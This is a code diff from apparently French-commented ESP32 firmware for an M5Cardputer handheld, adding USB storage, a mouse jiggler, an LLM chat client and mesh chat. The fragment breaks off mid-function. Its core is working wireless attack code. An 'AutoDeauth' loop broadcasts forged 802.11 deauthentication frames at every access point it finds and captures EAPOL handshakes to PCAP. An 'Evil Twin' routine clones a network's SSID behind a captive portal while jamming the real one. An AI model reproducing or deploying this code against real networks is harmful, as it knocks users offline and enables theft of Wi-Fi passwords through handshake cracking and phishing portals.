+  uint64_t availableSpace = SD.totalBytes() - SD.usedBytes();
+  if (bufferSize > availableSpace) {
+    return -1;
+  }
+  const uint32_t sectorSize = SD.sectorSize();
+  if (sectorSize == 0) {
+    return -1;
+  }
+  for (uint32_t blockIndex = 0; blockIndex < bufferSize / sectorSize; ++blockIndex) {
+    static uint8_t blockBuffer[512]; // Allocation statique
+    memcpy(blockBuffer, dataBuffer + sectorSize * blockIndex, sectorSize);
+    if (!SD.writeRAW(blockBuffer, logicalBlockAddr + blockIndex)) {
+      return -1;
+    }
+  }
+  return bufferSize;
+}
+
+int32_t handleUsbRead(uint32_t logicalBlockAddr, uint32_t dataOffset, void* dataBuffer, uint32_t bufferSize) {
+  const uint32_t sectorSize = SD.sectorSize();
+  if (sectorSize == 0) {
+    return -1;
+  }
+  for (uint32_t blockIndex = 0; blockIndex < bufferSize / sectorSize; ++blockIndex) {
+    if (!SD.readRAW(reinterpret_cast<uint8_t*>(dataBuffer) + (blockIndex * sectorSize), logicalBlockAddr + blockIndex)) {
+      return -1;
+    }
+  }
+  return bufferSize;
+}
+
+bool manageUsbPower(uint8_t powerState, bool start, bool loadEject) {
+  return true;
+}
+
+// Initialisation des callbacks et configuration du média pour l'USB MSC
+void initializeUsbCallbacks() {
+  uint32_t sectorSize = SD.sectorSize();
+  uint32_t totalSectors = SD.numSectors();
+
+  // Vérifier que la carte SD est bien montée
+  if (totalSectors == 0 || sectorSize == 0) {
+    return;
+  }
+
+  usbMassStorage.vendorID("ESP32");
+  usbMassStorage.productID("USB_MSC");
+  usbMassStorage.productRevision("1.0");
+  usbMassStorage.onRead(handleUsbRead);
+  usbMassStorage.onWrite(handleUsbWrite);
+  usbMassStorage.onStartStop(manageUsbPower);
+  usbMassStorage.mediaPresent(true);  // On indique que le média est présent
+  usbMassStorage.begin(totalSectors, sectorSize);
+}
+
+// Fonction principale qui passe du SD à l'USB
+void sdToUsb() {
+  // Arrêter l'accès à la carte SD
+  SD.end();
+  delay(100);
+
+  // Démarrer l'interface SPI pour la carte SD
+  spiInterface.begin(sdClockPin, sdDataInPin, sdDataOutPin, sdChipSelectPin);
+
+  // Attente stricte du montage du média SD
+  while (!SD.begin(sdChipSelectPin, spiInterface)) {
+    delay(1000);
+  }
+
+  // Initialisation des callbacks USB et configuration du stockage
+  initializeUsbCallbacks();
+
+  // Démarrage de la connexion USB
+  USB.begin();
+
+  // Affichage sur l'écran
+  M5.Display.fillScreen(TFT_BLACK);
+  M5.Display.setTextSize(1);
+  M5.Display.setCursor(0, 0);
+  M5.Display.println("Mounting SDCard on USB, please wait...");
+
+  // Attente active jusqu'à ce que l'USB soit monté et stable
+  // On attend que tud_mounted() retourne true de manière continue pendant 1 seconde
+  uint32_t stableTime = millis();
+  while (true) {
+    if (tud_mounted()) {
+      if (millis() - stableTime > 45000) {  // 5 secondes de stabilité
+        break;
+      }
+    } else {
+      // Si tud_mounted() retourne false, on réinitialise le compteur
+      stableTime = millis();
+    }
+    M5Cardputer.update();
+    delay(10);
+  }
+
+  waitAndReturnToMenu("SD mounted on USB");
+}
+
+
+
+
+
+
+
+
+//AutoDeauth
+int nombreDeEAPOLAuto = 0;
+#define mac_history_len 512
+
+struct mac_addr {
+  unsigned char bytes[6];
+};
+
+struct mac_addr mac_history[mac_history_len];
+unsigned int mac_history_cursor = 0;
+
+void save_mac(unsigned char* mac) {
+  if (mac_history_cursor >= mac_history_len) {
+    mac_history_cursor = 0;
+  }
+  struct mac_addr tmp;
+  memcpy(tmp.bytes, mac, 6);
+  mac_history[mac_history_cursor] = tmp;
+  mac_history_cursor++;
+}
+
+boolean seen_mac(unsigned char* mac) {
+  struct mac_addr tmp;
+  memcpy(tmp.bytes, mac, 6);
+  for (int x = 0; x < mac_history_len; x++) {
+    if (mac_cmp(tmp, mac_history[x])) {
+      return true;
+    }
+  }
+  return false;
+}
+
+boolean mac_cmp(struct mac_addr addr1, struct mac_addr addr2) {
+  for (int y = 0; y < 6; y++) {
+    if (addr1.bytes[y] != addr2.bytes[y]) {
+      return false;
+    }
+  }
+  return true;
+}
+
+void clear_mac_history() {
+  // Réinitialiser l'historique des MACs
+  mac_history_cursor = 0;
+  memset(mac_history, 0, sizeof(mac_history));
+  Serial.println("MAC history cleared.");
+}
+
+void sendDeauthPacketAuto(uint8_t *apMac, uint8_t channel) {
+  uint8_t deauthPacket[26] = {
+    0xC0, 0x00, // Type/Subtype: Deauthentication (0xC0)
+    0x3A, 0x01, // Duration
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: Broadcast
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: AP MAC
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: AP MAC
+    0x00, 0x00, // Fragment number and sequence number
+    0x07, 0x00  // Reason code: Class 3 frame received from nonassociated STA
+  };
+
+  memcpy(&deauthPacket[10], apMac, 6);  // AP MAC address
+  memcpy(&deauthPacket[16], apMac, 6);  // BSSID (AP MAC)
+
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE); // Changer de canal
+  for (int i = 0; i < 10; i++) {
+    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false); // Envoyer le paquet
+    delay(1);
+  }
+
+  Serial.println("Deauth packets sent");
+  Serial.println("===============================");
+}
+
+String security_int_to_string(int security_type) {
+  // Convertit le type de sécurité en chaîne lisible
+  switch (security_type) {
+    case WIFI_AUTH_OPEN:
+      return "OPEN";
+    case WIFI_AUTH_WEP:
+      return "WEP";
+    case WIFI_AUTH_WPA_PSK:
+      return "WPA_PSK";
+    case WIFI_AUTH_WPA2_PSK:
+      return "WPA2_PSK";
+    case WIFI_AUTH_WPA_WPA2_PSK:
+      return "WPA/WPA2_PSK";
+    case WIFI_AUTH_WPA2_ENTERPRISE:
+      return "WPA2_ENTERPRISE";
+    case WIFI_AUTH_WPA3_PSK:
+      return "WPA3_PSK";
+    default:
+      return "UNKNOWN";
+  }
+}
+
+bool isBeacon(const wifi_promiscuous_pkt_t* packet) {
+  const uint8_t *payload = packet->payload;
+  uint16_t len = packet->rx_ctrl.sig_len;
+
+  if (len < 24) { 
+    return false;
+  }
+
+  uint16_t frameControl = ((uint16_t)payload[1] << 8) | payload[0];
+  uint8_t frameType = (frameControl & 0x000C) >> 2;
+  uint8_t frameSubType = (frameControl & 0x00F0) >> 4;
+
+  if (frameType == 0 && frameSubType == 8) {
+    return true;
+  }
+
+  return false;
+}
+
+void captureAssociatedBeacon(uint8_t *bssidTarget) {
+  // On garde le canal courant
+  uint8_t originalChannelAuto;
+  esp_wifi_get_channel(&originalChannelAuto, nullptr);
+
+  // On écoute sur tous les canaux rapidement
+  for (int ch = 1; ch <= 13; ch++) {
+    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+    delay(100);  // petite pause pour laisser le temps aux beacons de passer
+
+    int n = WiFi.scanNetworks(false, true, false, 1000, ch);
+    for (int i = 0; i < n; i++) {
+      uint8_t *foundBssid = WiFi.BSSID(i);
+      if (foundBssid && memcmp(foundBssid, bssidTarget, 6) == 0) {
+        String ssid = WiFi.SSID(i);
+        String bssidStr = WiFi.BSSIDstr(i);
+        int32_t rssi = WiFi.RSSI(i);
+        String security = security_int_to_string(WiFi.encryptionType(i));
+        int32_t chFound = WiFi.channel(i);
+
+        Serial.println("Beacon associé trouvé !");
+        displayAPInfo(ssid, bssidStr, security, rssi, chFound);
+        return;
+      }
+    }
+  }
+
+  esp_wifi_set_channel(originalChannelAuto, WIFI_SECOND_CHAN_NONE); // retour au canal initial
+  Serial.println("Beacon associée introuvable.");
+}
+
+void displayAPInfo(String ssid, String bssid, String security, int32_t rssi, int32_t channel) {
+  M5.Lcd.clear();
+  M5.Lcd.setCursor(0, 10);
+  M5.Lcd.setTextSize(1.5);
+
+  M5.Lcd.println("== AP Information ==");
+  M5.Lcd.printf("Channel: %d\n", channel);
+  M5.Lcd.printf("SSID:%s\n", ssid.c_str());
+  M5.Lcd.printf("MAC:%s\n", bssid.c_str());
+  M5.Lcd.printf("Security:%s\n", security.c_str());
+  M5.Lcd.printf("RSSI: %d dBm\n", rssi);
+  M5.Lcd.printf("EAPOL: %d", nombreDeEAPOLAuto);
+}
+
+void extractBSSID(const uint8_t* payload, uint16_t frameControl, uint8_t* bssid) {
+  uint8_t frameType = (frameControl & 0x000C) >> 2;
+  uint8_t toDS = (frameControl & 0x0100) >> 8;
+  uint8_t fromDS = (frameControl & 0x0200) >> 9;
+
+  if (frameType == 0) {
+    memcpy(bssid, &payload[16], 6); // Management frame
+  } else if (frameType == 2) {
+    if (toDS == 0 && fromDS == 0) {
+      memcpy(bssid, &payload[16], 6);
+    } else if (toDS == 1 && fromDS == 0) {
+      memcpy(bssid, &payload[4], 6);
+    } else if (toDS == 0 && fromDS == 1) {
+      memcpy(bssid, &payload[10], 6);
+    } else {
+      memset(bssid, 0, 6);
+    }
+  } else {
+    memset(bssid, 0, 6);
+  }
+}
+
+
+uint8_t lastEAPOLBSSID[6];
+bool eapolDetected = false;
+
+void eapolSnifferAutoCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+  const uint8_t *payload = pkt->payload;
+  uint16_t len = pkt->rx_ctrl.sig_len;
+
+  // Extraction du Frame Control
+  uint16_t frameCtrl = ((uint16_t)payload[1] << 8) | payload[0];
+  uint8_t bssid[6];
+  extractBSSID(payload, frameCtrl, bssid);
+
+  // === EAPOL ===
+  if (estUnPaquetEAPOL(pkt)) {
+    Serial.println("EAPOL Detected!");
+
+    enregistrerDansFichierPCAP(pkt, false); 
+    nombreDeEAPOLAuto++;
+
+    memcpy(lastEAPOLBSSID, bssid, 6);  // on retient le BSSID
+    eapolDetected = true;
+
+    if (!seen_mac(bssid)) {
+      captureAssociatedBeacon(bssid); // Info visuelle
+      save_mac(bssid);
+    }
+  }
+
+  // === Beacon ===
+  else if (eapolDetected && isBeacon(pkt)) {
+    if (memcmp(lastEAPOLBSSID, bssid, 6) == 0) {
+      Serial.println("Beacon associée détectée !");
+      pkt->rx_ctrl.sig_len -= 4;  // Réduire la longueur du signal de 4 bytes
+      enregistrerDansFichierPCAP(pkt, false); 
+      eapolDetected = false; // évite de prendre plusieurs fois
+    }
+  }
+}
+
+
+
+void autoDeauther() {
+  unsigned long lastTime = 0;
+  unsigned long timerDelay = 200;
+  unsigned long clearMacHistoryTime = 0;
+  const unsigned long macHistoryInterval = 15000;
+  int channel = 1;
+  const int maxChannel = 13;
+
+  char bufBSSID[64];
+  char Buf[50];
+
+  M5Cardputer.Display.fillScreen(TFT_BLACK);
+  M5Cardputer.Display.setCursor(0, 0);
+  M5Cardputer.Display.setTextSize(1.5);
+
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_rx_cb(eapolSnifferAutoCallback);
+  
+  while (true) {
+    M5.update();
+    M5Cardputer.update();
+
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+      break;
+    }
+
+    if ((millis() - clearMacHistoryTime) > macHistoryInterval) {
+      clear_mac_history();
+      clearMacHistoryTime = millis();
+    }
+
+    if ((millis() - lastTime) > timerDelay) {
+      esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+      int n = WiFi.scanNetworks(false, true, false, 1000, channel);
+
+      if (n == 0) {
+        Serial.println("No networks found");
+      } else {
+        for (int i = 0; i < n; i++) {
+          uint8_t* bssidPtr = WiFi.BSSID(i);
+          if (bssidPtr == NULL) {
+            Serial.println("Invalid BSSID pointer, skipping...");
+            continue;
+          }
+        
+          if (seen_mac(bssidPtr)) {
+            Serial.println("Already sent to: " + WiFi.BSSIDstr(i));
+            continue;
+          }
+        
+          // Sauvegarde sécurisée des données
+          String MacString = WiFi.BSSIDstr(i);
+          strncpy(bufBSSID, MacString.c_str(), sizeof(bufBSSID) - 1);
+          bufBSSID[sizeof(bufBSSID) - 1] = '\0';
+          strcpy(myData.bssid, bufBSSID);
+        
+          String AP = WiFi.SSID(i);
+          strncpy(Buf, AP.c_str(), sizeof(Buf) - 1);
+          Buf[sizeof(Buf) - 1] = '\0';
+          strcpy(myData.ssid, Buf);
+        
+          String securityType = security_int_to_string(WiFi.encryptionType(i));
+          int32_t rssi = WiFi.RSSI(i);
+          int32_t apChannel = WiFi.channel(i);
+        
+          // Affichage série
+          Serial.println("=== Access Point Information ===");
+          Serial.printf("SSID: %s\n", AP.c_str());
+          Serial.printf("BSSID: %s\n", MacString.c_str());
+          Serial.printf("Security: %s\n", securityType.c_str());
+          Serial.printf("RSSI: %d dBm\n", rssi);
+          Serial.printf("Channel: %d\n", apChannel);
+          Serial.println("===============================");
+
+          displayAPInfo(AP, MacString, securityType, rssi, apChannel);
+  
+          // Actions
+          save_mac(bssidPtr);
+          for (int i = 0; i < 5; i++) {
+            sendDeauthPacketAuto(bssidPtr, apChannel);          
+          }
+         delay(50);
+        }
+        unsigned long listenStart = millis();
+        while (millis() - listenStart < 2000) {
+          delay(1);
+        }
+      }
+
+      lastTime = millis();
+
+      // Changement de canal
+      channel++;
+      if (channel > maxChannel) channel = 1;
+
+      M5.Lcd.clear();
+      M5.Lcd.setCursor(10, 10);
+      M5.Lcd.printf("Current Channel: %d", channel);
+      M5.Lcd.println(" ");
+      M5.Lcd.println(" ");
+      M5.Lcd.println(" ");
+      M5.Lcd.println(" ");
+      M5.Lcd.println(" ");
+      M5.Lcd.println(" ");
+      M5.Lcd.printf("EAPOL: %d", nombreDeEAPOLAuto);
+    }
+    delay(10);  // petite pause CPU
+  }
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_promiscuous_rx_cb(NULL);
+
+  waitAndReturnToMenu("Stopping AutoDeauth");  // retour au menu principal
+}
+
+
+//mouse-jiggler
+USBHIDMouse Mouse;
+unsigned long delayBetweenMoves = 2000;
+unsigned long lastMoveTime = 0;
+int moveAmount = 30;
+
+void runMouseJiggler() {
+  USB.begin();  
+  Mouse.begin();
+
+  M5.Display.clear();
+  M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
+  M5.Display.setTextSize(1.5);
+  M5.Display.setCursor(70, 50);
+  M5.Display.println("Jiggling...");
+
+  // Affichage du délai et du mouvement
+  auto displayInfo = []() {
+    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
+    M5.Display.fillRect(0, 0, M5.Display.width(), 24, BLACK);  // Ajusté pour deux lignes
+    M5.Display.setCursor(50, 0);
+    M5.Display.printf("< Delay:%lums >     ", delayBetweenMoves);
+    M5.Display.setCursor(50, 20);
+    M5.Display.printf("^  Move:%dpx  v    ", moveAmount);  };
+
+  // Animation lapin
+  auto drawBunny = [](int frame) {
+    M5.Display.fillRect(0, 100, M5.Display.width(), 48, BLACK);
+    if (frame == 1) {
+      M5.Display.setCursor(40, 100);
+      M5.Display.println("()-() (\\__/)");
+      M5.Display.setCursor(30, 112);
+      M5.Display.println("  \\\"/  (o.o )");
+      M5.Display.setCursor(30, 124);
+      M5.Display.println("   `   <   <");
+    } else {
+      M5.Display.setCursor(80, 100);
+      M5.Display.println(" (\\__/) ()-()");
+      M5.Display.setCursor(70, 112);
+      M5.Display.println("  ( o.o)  \\\"/");
+      M5.Display.setCursor(70, 124);
+      M5.Display.println("   >   >   ` ");
+    }
+  };
+
+  displayInfo();
+  bool stop = false;
+  int bunnyFrame = 0;
+  int moveDirection = 1;
+
+  while (!stop) {
+    M5Cardputer.update();
+
+    // Stop
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+      stop = true;
+      break;
+    }
+
+    // Réduction du délai
+    if (M5Cardputer.Keyboard.isKeyPressed(',')) {
+      delayBetweenMoves = (delayBetweenMoves >= 500) ? delayBetweenMoves - 500 : 0;
+      displayInfo();
+      delay(200);
+    }
+
+    // Augmentation du délai
+    if (M5Cardputer.Keyboard.isKeyPressed('/')) {
+      delayBetweenMoves = min(300000UL, delayBetweenMoves + 500);
+      displayInfo();
+      delay(200);
+    }
+
+    // Augmentation du mouvement
+    if (M5Cardputer.Keyboard.isKeyPressed(';')) {
+      moveAmount = min(100, moveAmount + 1);
+      displayInfo();
+      delay(150);
+    }
+
+    // Réduction du mouvement
+    if (M5Cardputer.Keyboard.isKeyPressed('.')) {
+      moveAmount = max(3, moveAmount - 1);
+      displayInfo();
+      delay(150);
+    }
+
+    // Mouvement automatique
+    if (millis() - lastMoveTime >= delayBetweenMoves) {
+      drawBunny(bunnyFrame);
+      Mouse.move(moveAmount * moveDirection, 0);
+      delay(100);
+      lastMoveTime = millis();
+
+      bunnyFrame = 1 - bunnyFrame;
+      moveDirection *= -1;
+    }
+
+    delay(10);
+  }
+
+  Mouse.end();
+  waitAndReturnToMenu("Stopping MouseJiggler");
+}
+
+
+
+void startEvilTwin(int index) {
+    if (index < 0 || index >= numSsid) {
+        Serial.println("Index invalide pour Evil Twin");
+        return;
+    }
+
+    String targetSSID = ssidList[index];
+    int targetChannel = WiFi.channel(index);
+    uint8_t* targetBSSID = WiFi.BSSID(index);
+
+    // Mise à jour de l'AP cloné
+    clonedSSID = targetSSID;
+    createCaptivePortal(); // Faux AP lancé
+    WiFi.mode(WIFI_MODE_APSTA);
+    
+    M5.Display.clear();
+    M5.Display.setTextSize(1.5);
+    M5.Display.setCursor(0, 10);
+    M5.Display.println("== Evil Twin Mode ==");
+    M5.Display.println("SSID : " + targetSSID);
+    M5.Display.println("Channel : " + String(targetChannel));
+
+    int packetCount = 0;
+    unsigned long lastUpdate = 0;
+
+    while (true) {
+        M5Cardputer.update();
+        handleDnsRequestSerial();
+        // Check si RETURN est pressé
+        if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) break;
+
+        // Rafraîchissement écran toutes les 200ms
+        if (millis() - lastUpdate > 100) {
+            // Envoie des paquets de deauth
+            sendDeauthPacketAuto(targetBSSID, targetChannel);
+            packetCount ++;
+            int clients = getConnectedPeopleCount();
+
+            M5.Display.fillRect(0, 60, 240, 40, menuBackgroundColor);
+            M5.Display.setCursor(0, 60);
+            M5.Display.printf("Deauth : %d\n", packetCount);
+            M5.Display.printf("Client : %d\n", clients);
+
+            lastUpdate = millis();
+        }
+        delay(1); // évite surchauffe CPU
+    }
+
+    stopCaptivePortal();
+    waitAndReturnToMenu("Evil Twin Stopped");
+}
+
+
+
+
+
+
+
+String encodeBase64(const String& input) {
+  const char* base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+  String output = "";
+  int i = 0;
+  uint8_t array3[3];
+  uint8_t array4[4];
+
+  int inputLen = input.length();
+  int index = 0;
+
+  while (inputLen--) {
+    array3[i++] = input[index++];
+    if (i == 3) {
+      array4[0] = (array3[0] & 0xfc) >> 2;
+      array4[1] = ((array3[0] & 0x03) << 4) + ((array3[1] & 0xf0) >> 4);
+      array4[2] = ((array3[1] & 0x0f) << 2) + ((array3[2] & 0xc0) >> 6);
+      array4[3] = array3[2] & 0x3f;
+
+      for (i = 0; i < 4; i++)
+        output += base64_chars[array4[i]];
+      i = 0;
+    }
+  }
+
+  if (i) {
+    for (int j = i; j < 3; j++)
+      array3[j] = '\0';
+
+    array4[0] = (array3[0] & 0xfc) >> 2;
+    array4[1] = ((array3[0] & 0x03) << 4) + ((array3[1] & 0xf0) >> 4);
+    array4[2] = ((array3[1] & 0x0f) << 2) + ((array3[2] & 0xc0) >> 6);
+    array4[3] = array3[2] & 0x3f;
+
+    for (int j = 0; j < i + 1; j++)
+      output += base64_chars[array4[j]];
+
+    while ((i++ < 3))
+      output += '=';
+  }
+
+  return output;
+}
+
+void evilLLMChatStream() {
+  if (WiFi.localIP().toString() == "0.0.0.0") {
+    Serial.println("[INFO] Not connected to a network.");
+    waitAndReturnToMenu("Not connected to a network.");
+    return;
+  }
+
+  inMenu = false;
+
+  const int charWidth = 8;
+  const int lineHeight = 13;
+  const int screenWidth = 208;
+  const int linesPerPage = 9;
+
+  M5.Display.clear();
+  M5.Display.setCursor(0, 0);
+  M5.Display.println("Prompt >");
+
+  while (true) {
+    String userPrompt = getUserInput("Prompt > ");
+    if (userPrompt.length() == 0) continue;
+
+    WiFiClientSecure client;
+    client.setInsecure();
+    client.setTimeout(10000);
+
+    if (!client.connect(llmHost.c_str(), llmhttpsPort)) {
+      waitAndReturnToMenu("Connection failed.");
+      return;
+    }
+
+    String requestBody =
+      "{\"model\":\"" + llmModel +
+      "\",\"prompt\":\"" + userPrompt +
+      "\",\"stream\":true,\"options\":{\"num_predict\":" + String(llmMaxTokens) + "}}";
+
+    String authRaw = llmUser + ":" + llmPass;
+    String authB64 = encodeBase64(authRaw);
+
+    String request =
+      "POST " + llmapiPath + " HTTP/1.1\r\n" +
+      "Host: " + llmHost + "\r\n" +
+      "Authorization: Basic " + authB64 + "\r\n" +
+      "Content-Type: application/json\r\n" +
+      "Content-Length: " + String(requestBody.length()) + "\r\n" +
+      "Connection: close\r\n\r\n" +
+      requestBody;
+
+    M5.Display.clear();
+    M5.Display.setCursor(0, 0);
+    M5.Display.println("Send.");
+    M5.Display.println("Waiting answer...");
+
+    client.print(request);
+
+    while (client.connected() && !M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+      String line = client.readStringUntil('\n');
+      if (line == "\r") break;
+    }
+
+    std::vector<String> lines;
+    String currentLine = "";
+    int scrollOffset = 0;
+    bool gotFirstToken = false;
+    unsigned long streamStart = millis();
+
+    M5.Display.clear();
+
+    while (client.connected()) {
+      M5.update();
+      M5Cardputer.update();
+
+      // Interruption utilisateur
+      if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+        client.stop();
+        waitAndReturnToMenu("Stream interrupted by user");
+        return;
+      }
+
+      // Timeout si aucun token reçu
+      if (!gotFirstToken && millis() - streamStart > 10000) {
+        client.stop();
+        waitAndReturnToMenu("LLM not responding (timeout)");
+        return;
+      }
+
+      // Scroll 
+      if (M5Cardputer.Keyboard.isKeyPressed(';') && scrollOffset > 0) {
+        scrollOffset--;
+        M5.Display.clear();
+        for (int i = 0; i < linesPerPage; i++) {
+          int idx = scrollOffset + i;
+          if (idx < lines.size()) {
+            M5.Display.setCursor(0, 10 + i * lineHeight);
+            M5.Display.println(lines[idx]);
+          }
+        }
+        delay(150);
+        continue;
+      } else if (M5Cardputer.Keyboard.isKeyPressed('.') && scrollOffset < lines.size()) {
+        scrollOffset++;
+        M5.Display.clear();
+        for (int i = 0; i < linesPerPage; i++) {
+          int idx = scrollOffset + i;
+          if (idx < lines.size()) {
+            M5.Display.setCursor(0, 10 + i * lineHeight);
+            M5.Display.println(lines[idx]);
+          }
+        }
+        delay(150);
+        continue;
+      }
+
+      String line = client.readStringUntil('\n');
+      line.trim();
+      if (line.length() == 0) continue;
+
+      StaticJsonDocument<512> doc;
+      DeserializationError err = deserializeJson(doc, line);
+      if (err) continue;
+      if (doc["done"] == true) break;
+
+      if (doc.containsKey("response")) {
+        gotFirstToken = true;
+        String token = doc["response"].as<String>();
+        token.replace("\\n", "\n");
+
+        String word = "";
+        for (int i = 0; i <= token.length(); i++) {
+          char c = token[i];
+          bool isEnd = (i == token.length());
+          bool isSpace = (c == ' ' || c == '\n' || isEnd);
+
+          if (!isEnd && !isSpace) {
+            word += c;
+            continue;
+          }
+
+          int wordPixelLength = word.length() * charWidth;
+          int linePixelLength = currentLine.length() * charWidth;
+
+          if (linePixelLength + wordPixelLength > screenWidth) {
+            lines.push_back(currentLine);
+            currentLine = "";
+            linePixelLength = 0;
+          }
+
+          if (wordPixelLength > screenWidth) {
+            for (int j = 0; j < word.length(); j++) {
+              currentLine += word[j];
+              if ((currentLine.length() * charWidth) >= screenWidth) {
+                lines.push_back(currentLine);
+                currentLine = "";
+              }
+            }
+          } else {
+            currentLine += word;
+          }
+
+          if (!isEnd && c != '\n') currentLine += c;
+          if (c == '\n') {
+            lines.push_back(currentLine);
+            currentLine = "";
+          }
+
+          word = "";
+        }
+
+        if ((lines.size() - scrollOffset) < linesPerPage) {
+          M5.Display.clear();
+          for (int i = 0; i < linesPerPage; i++) {
+            int idx = scrollOffset + i;
+            if (idx < lines.size()) {
+              M5.Display.setCursor(0, 10 + i * lineHeight);
+              M5.Display.println(lines[idx]);
+            }
+          }
+
+          if (currentLine.length() > 0) {
+            M5.Display.setCursor(0, 10 + (lines.size() - scrollOffset) * lineHeight);
+            M5.Display.println(currentLine);
+          }
+        }
+      }
+    }
+
+    if (currentLine.length() > 0) lines.push_back(currentLine);
+    lines.push_back("______");
+
+    while (true) {
+      M5.update();
+      M5Cardputer.update();
+
+      if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+        waitAndReturnToMenu("evilChatStream Stopped");
+        return;
+      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+        M5.Display.clear();
+        M5.Display.setCursor(0, 0);
+        M5.Display.println("Prompt >");
+        break;
+      } else if (M5Cardputer.Keyboard.isKeyPressed(';') && scrollOffset > 0) {
+        scrollOffset--;
+        M5.Display.clear();
+      } else if (M5Cardputer.Keyboard.isKeyPressed('.') && scrollOffset < lines.size()) {
+        scrollOffset++;
+        M5.Display.clear();
+      }
+
+      for (int i = 0; i < linesPerPage; i++) {
+        int idx = scrollOffset + i;
+        if (idx < lines.size()) {
+          M5.Display.setCursor(0, 10 + i * lineHeight);
+          M5.Display.println(lines[idx]);
+        }
+      }
+
+      delay(100);
+    }
+  }
+}
+
+
+
+
+
+
+
+
+
+
+
+#define MAX_MSG_LEN 100
+#define MAX_HISTORY 32
+#define MAX_NODES 30
+
+struct NodePresence {
+    char nick[16];
+    unsigned long lastSeen;
+};
+
+struct MeshMessage {
+    char id[9];
+    char from[16];
+    char body[MAX_MSG_LEN];
+};
+
+struct Message {
+    char content[MAX_MSG_LEN];
+};
+
+// --- VARIABLES GLOBALES ---
+NodePresence nodesConnected[MAX_NODES];  // ok ici maintenant
+int nodesCount = 0;
+
+char seenMessageIds[MAX_HISTORY][9];
+int seenIndex = 0;
+char inputBuffer[MAX_MSG_LEN] = "";
+
+uint8_t broadcastAddressEspNow[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+
+Message messages[20];
+int messageCount = 0;
+int messageHead = 0;
+
+// Constants
+#define TIMEOUT_PRESENCE 2000  
+#define PING_INTERVAL 500      
+unsigned long lastPing = 0;
+
+
+// ----- Hash pour déduplication -----
+void simpleHash(const char* s, char* outHash) {
+    uint32_t hash = 5381;
+    while (*s) {
+        hash = ((hash << 5) + hash) + (uint8_t)(*s++);
+    }
+    snprintf(outHash, 9, "%08X", hash);
+    outHash[8] = '\0';
+}
+
+// ----- CRC16 (CRC-CCITT) -----
+uint16_t crc16(const uint8_t* data, size_t length) {
+    uint16_t crc = 0xFFFF;
+    for (size_t i = 0; i < length; i++) {
+        crc ^= ((uint16_t)data[i] << 8);
+        for (int j = 0; j < 8; j++) {
+            crc = (crc & 0x8000) ? ((crc << 1) ^ 0x1021) : (crc << 1);
+        }
+    }
+    return crc;
+}
+
+// ----- Gestion historique de messages -----
+bool hasSeenId(const char* id) {
+    for (int i = 0; i < MAX_HISTORY; i++) {
+        if (strncmp(seenMessageIds[i], id, 8) == 0) return true;
+    }
+    return false;
+}
+
+void rememberId(const char* id) {
+    strncpy(seenMessageIds[seenIndex], id, 8);
+    seenMessageIds[seenIndex][8] = '\0';
+    seenIndex = (seenIndex + 1) % MAX_HISTORY;
+}
+
+void addMessage(const char* msg) {
+    strncpy(messages[messageHead].content, msg, MAX_MSG_LEN);
+    messages[messageHead].content[MAX_MSG_LEN - 1] = '\0';
+    messageHead = (messageHead + 1) % 20;
+    if (messageCount < 20) messageCount++;
+}
+
+void drawChatWindow() {
+    M5.Display.fillScreen(TFT_BLACK);
+    
+    // Affiche le nombre de personnes connectées
+    M5.Display.setTextColor(TFT_GREEN);
+    M5.Display.setCursor(0, 0);
+    M5.Display.printf("Connected: %d", nodesCount);
+    
+    // Affiche les messages
+    M5.Display.setTextColor(TFT_WHITE);
+    M5.Display.setCursor(0, 10);
+    int linesToShow = 13;
+    int start = (messageCount < linesToShow) ? 0 : (messageHead + 20 - linesToShow) % 20;
+    for (int i = 0; i < min(linesToShow, messageCount); i++) {
+        int index = (start + i) % 20;
+        M5.Display.println(messages[index].content);
+    }
+
+    M5.Display.display();
+}
+
+
+// ----- Commandes IRC -----
+void handleCommand(const char* input) {
+    if (strncmp(input, "/nick ", 6) == 0) {
+        strncpy(currentNick, input + 6, 15);
+        currentNick[15] = '\0';
+        char msg[MAX_MSG_LEN];
+        snprintf(msg, MAX_MSG_LEN, "Nickname set to: %s", currentNick);
+        addMessage(msg);
+        drawChatWindow();
+    } else if (strcmp(input, "/clear") == 0) {
+        messageCount = 0;
+        messageHead = 0;
+        drawChatWindow();
+    } else if (strncmp(input, "/me ", 4) == 0) {
+        char action[MAX_MSG_LEN];
+        snprintf(action, MAX_MSG_LEN, "* %s %s", currentNick, input + 4);
+
+        MeshMessage msg;
+        char hashOut[9], temp[MAX_MSG_LEN + 16];
+        snprintf(temp, sizeof(temp), "%s%lu", action, millis());
+        simpleHash(temp, hashOut);
+
+        strncpy(msg.id, hashOut, 8); msg.id[8] = '\0';
+        strncpy(msg.from, currentNick, 15); msg.from[15] = '\0';
+        strncpy(msg.body, action, MAX_MSG_LEN - 1); msg.body[MAX_MSG_LEN - 1] = '\0';
+
+        // Envoi avec CRC
+        uint8_t packet[sizeof(MeshMessage) + sizeof(uint16_t)];
+        memcpy(packet, &msg, sizeof(MeshMessage));
+        uint16_t crc = crc16((uint8_t*)&msg, sizeof(MeshMessage));
